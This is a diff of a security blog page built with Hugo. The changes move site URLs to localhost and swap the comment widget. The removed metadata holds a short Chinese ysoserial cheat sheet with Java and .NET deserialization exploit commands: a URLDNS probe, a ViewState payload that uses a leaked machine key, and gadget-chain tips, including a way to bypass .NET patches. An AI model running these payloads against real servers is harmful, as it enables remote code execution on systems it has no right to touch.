@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="dark">
 
-<head><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
+<meta name="robots" content="noindex, nofollow">
 <title>Yso | h4xk0r blog</title>
 <meta name="keywords" content="">
 <meta name="description" content="JAVA_YSO
@@ -32,16 +32,16 @@ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;cmd /c echo pw
 -p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
 利用链:">
 <meta name="author" content="h4xk0r">
-<link rel="canonical" href="https://b1ckdoor.com/posts/yso/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://b1ckdoor.com/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://b1ckdoor.com/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://b1ckdoor.com/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://b1ckdoor.com/apple-touch-icon.png">
-<link rel="mask-icon" href="https://b1ckdoor.com/safari-pinned-tab.svg">
+<link rel="canonical" href="http://localhost:1313/posts/yso/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da54c57d4305d35203753b611a507d3c3386f2dc610c5ecafc9137dfc0197499.css" integrity="sha256-2lTFfUMF01IDdTthGlB9PDOG8txhDF7K/JE338AZdJk=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://b1ckdoor.com/posts/yso/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/yso/">
 <noscript>
     <style>
         #theme-toggle,
@@ -56,108 +56,13 @@ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;cmd /c echo pw
         document.querySelector("html").dataset.theme = 'light';
     }
 
-</script><meta property="og:url" content="https://b1ckdoor.com/posts/yso/">
-  <meta property="og:site_name" content="h4xk0r blog">
-  <meta property="og:title" content="Yso">
-  <meta property="og:description" content="JAVA_YSO 基础命令格式 java -jar ysoserial.jar [利用链] [执行的命令] 利用链: CommonsCollections1, URLDNS, Jackson 等 探测/检测 如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用URLDNS
-java -jar ysoserial.jar URLDNS &#34;http://your-dnslog-url.com&#34; 注: 如果执行复杂命令最好封装成脚本执行,或者使用sh -c/bash -c
-.net_yso 基础命令
-ysoserial.exe -g [Gadget] -f [Formatter] -c &#34;[Command]&#34; -o 编码 -g 利用链的名称,如TextFormattingRunProperties -f 序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter -c 执行的命令 -o 编码处理,如 raw ,bash64, urlencode 利用 (web Machinekey泄露)
-ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;cmd /c echo pwned &gt; C:\windows\temp\test.txt&#34; --validationkey=&#34;你的KEY&#34; --validationalg=&#34;SHA1&#34; 技巧
-- p 参数可以指定插件,对一些特定目标进行测试
--p ViewState：处理 ASP.NET ViewState。 -p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 利用链:">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-04-10T23:50:39+08:00">
-    <meta property="article:modified_time" content="2026-04-10T23:50:39+08:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Yso">
-<meta name="twitter:description" content="JAVA_YSO
-基础命令格式
-java -jar ysoserial.jar [利用链] [执行的命令]
-
-利用链: CommonsCollections1, URLDNS, Jackson 等
-探测/检测
-如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用URLDNS
-java -jar ysoserial.jar URLDNS &#34;http://your-dnslog-url.com&#34;
-注: 如果执行复杂命令最好封装成脚本执行,或者使用sh -c/bash -c
-.net_yso
-基础命令
-ysoserial.exe -g [Gadget] -f [Formatter] -c &#34;[Command]&#34; -o 编码
-
--g  利用链的名称,如TextFormattingRunProperties
--f  序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter
--c  执行的命令
--o  编码处理,如 raw ,bash64, urlencode
-利用  (web Machinekey泄露)
-ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;cmd /c echo pwned &gt; C:\windows\temp\test.txt&#34; --validationkey=&#34;你的KEY&#34; --validationalg=&#34;SHA1&#34;
-技巧
-- p 参数可以指定插件,对一些特定目标进行测试
--p ViewState：处理 ASP.NET ViewState。
--p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
-利用链:">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://b1ckdoor.com/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "Yso",
-      "item": "https://b1ckdoor.com/posts/yso/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "Yso",
-  "name": "Yso",
-  "description": "JAVA_YSO 基础命令格式 java -jar ysoserial.jar [利用链] [执行的命令] 利用链: CommonsCollections1, URLDNS, Jackson 等 探测/检测 如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用URLDNS\njava -jar ysoserial.jar URLDNS \u0026#34;http://your-dnslog-url.com\u0026#34; 注: 如果执行复杂命令最好封装成脚本执行,或者使用sh -c/bash -c\n.net_yso 基础命令\nysoserial.exe -g [Gadget] -f [Formatter] -c \u0026#34;[Command]\u0026#34; -o 编码 -g 利用链的名称,如TextFormattingRunProperties -f 序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter -c 执行的命令 -o 编码处理,如 raw ,bash64, urlencode 利用 (web Machinekey泄露)\nysoserial.exe -p ViewState -g TextFormattingRunProperties -c \u0026#34;cmd /c echo pwned \u0026gt; C:\\windows\\temp\\test.txt\u0026#34; --validationkey=\u0026#34;你的KEY\u0026#34; --validationalg=\u0026#34;SHA1\u0026#34; 技巧\n- p 参数可以指定插件,对一些特定目标进行测试\n-p ViewState：处理 ASP.NET ViewState。 -p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 利用链:\n",
-  "keywords": [
-    
-  ],
-  "articleBody": "JAVA_YSO 基础命令格式 java -jar ysoserial.jar [利用链] [执行的命令] 利用链: CommonsCollections1, URLDNS, Jackson 等 探测/检测 如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用URLDNS\njava -jar ysoserial.jar URLDNS \"http://your-dnslog-url.com\" 注: 如果执行复杂命令最好封装成脚本执行,或者使用sh -c/bash -c\n.net_yso 基础命令\nysoserial.exe -g [Gadget] -f [Formatter] -c \"[Command]\" -o 编码 -g 利用链的名称,如TextFormattingRunProperties -f 序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter -c 执行的命令 -o 编码处理,如 raw ,bash64, urlencode 利用 (web Machinekey泄露)\nysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c echo pwned \u003e C:\\windows\\temp\\test.txt\" --validationkey=\"你的KEY\" --validationalg=\"SHA1\" 技巧\n- p 参数可以指定插件,对一些特定目标进行测试\n-p ViewState：处理 ASP.NET ViewState。 -p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 利用链:\n场景/格式, 推荐 Gadget,\t说明 BinaryFormatter\tTextFormattingRunProperties\t通用性最强，成功率高 Json.NET\tObjectDataProvider\t针对特定配置的 JSON 解析 XamlReader,\tExpandedWrapper\t常用于 WPF 或特定 XML 处理 通用（高版本）\tActivitySurrogateSelector\t配合插件可执行任意 C# 代码 ",
-  "wordCount" : "104",
-  "inLanguage": "en",
-  "datePublished": "2026-04-10T23:50:39+08:00",
-  "dateModified": "2026-04-10T23:50:39+08:00",
-  "author":{
-    "@type": "Person",
-    "name": "h4xk0r"
-  },
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://b1ckdoor.com/posts/yso/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "h4xk0r blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://b1ckdoor.com/favicon.ico"
-    }
-  }
-}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://b1ckdoor.com/" accesskey="h" title="h4xk0r blog (Alt + H)">h4xk0r blog</a>
+            <a href="http://localhost:1313/" accesskey="h" title="h4xk0r blog (Alt + H)">h4xk0r blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -183,22 +88,22 @@ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;cmd /c echo pw
         </div>
         <ul id="menu">
             <li>
-                <a href="https://b1ckdoor.com/posts/" title="档案">
+                <a href="http://localhost:1313/posts/" title="档案">
                     <span>档案</span>
                 </a>
             </li>
             <li>
-                <a href="https://b1ckdoor.com/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                     <span>搜索</span>
                 </a>
             </li>
             <li>
-                <a href="https://b1ckdoor.com/categories/" title="分类">
+                <a href="http://localhost:1313/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="https://b1ckdoor.com/fuzzlist/" title="Fuzzlist">
+                <a href="http://localhost:1313/fuzzlist/" title="Fuzzlist">
                     <span>Fuzzlist</span>
                 </a>
             </li>
@@ -279,26 +184,89 @@ XamlReader,					    ExpandedWrapper					   	   常用于 WPF 或特定 XML 处�
   <footer class="post-footer">
     <ul class="post-tags">
     </ul>
-  </footer><script src="https://giscus.app/client.js"
-        data-repo="h4xk0r/h4xk0r.github.io"
-        data-repo-id="R_kgDORE9_Hw"
-        data-category="Announcements"
-        data-category-id="DIC_kwDORE9_H84C9ILE"
-        data-mapping="pathname"
-        data-strict="0"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="top"
-        data-theme="preferred_color_scheme"
-        data-lang="zh-CN"
-        crossorigin="anonymous"
-        async>
+  </footer><div id="utterances-container"></div>
+
+<script>
+    
+    function isDarkMode() {
+        const html = document.documentElement;
+        const body = document.body;
+
+        
+        if (html.getAttribute("data-theme") === "dark" || html.classList.contains("dark") ||
+            body.getAttribute("data-theme") === "dark" || body.classList.contains("dark")) {
+            return true;
+        }
+        
+        if (html.getAttribute("data-theme") === "light" || html.classList.contains("light") ||
+            body.getAttribute("data-theme") === "light" || body.classList.contains("light")) {
+            return false;
+        }
+        
+        const prefTheme = localStorage.getItem("pref-theme");
+        if (prefTheme) {
+            return prefTheme === "dark";
+        }
+        
+        return window.matchMedia('(prefers-color-scheme: dark)').matches;
+    }
+
+    function getTargetTheme() {
+        return isDarkMode() ? "github-dark" : "github-light";
+    }
+
+    function loadUtterances() {
+        const container = document.getElementById("utterances-container");
+        if (!container || container.hasChildNodes()) return;
+
+        const script = document.createElement("script");
+        script.src = "https://utteranc.es/client.js";
+        script.setAttribute("repo", "h4xk0r/h4xk0r.github.io"); 
+        script.setAttribute("issue-term", "pathname");
+        script.setAttribute("label", "comment");
+        script.setAttribute("theme", getTargetTheme());
+        script.setAttribute("crossorigin", "anonymous");
+        script.async = true;
+
+        container.appendChild(script);
+    }
+
+    function syncUtterancesTheme() {
+        const iframe = document.querySelector("iframe.utterances-frame");
+        if (iframe && iframe.contentWindow) {
+            iframe.contentWindow.postMessage({
+                type: 'set-theme',
+                theme: getTargetTheme()
+            }, 'https://utteranc.es');
+        }
+    }
+
+    
+    if (document.readyState === "interactive" || document.readyState === "complete") {
+        loadUtterances();
+    } else {
+        document.addEventListener("DOMContentLoaded", loadUtterances);
+    }
+
+    
+    const observer = new MutationObserver((mutations) => {
+        for (const mutation of mutations) {
+            if (mutation.attributeName === "class" || mutation.attributeName === "data-theme") {
+                syncUtterancesTheme();
+                break; 
+            }
+        }
+    });
+
+    
+    observer.observe(document.documentElement, { attributes: true, attributeFilter: ["class", "data-theme"] });
+    observer.observe(document.body, { attributes: true, attributeFilter: ["class", "data-theme"] });
 </script>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="https://b1ckdoor.com/">h4xk0r blog</a></span> · 
+        <span>&copy; 2026 <a href="http://localhost:1313/">h4xk0r blog</a></span> · 
 
     <span>
         Powered by
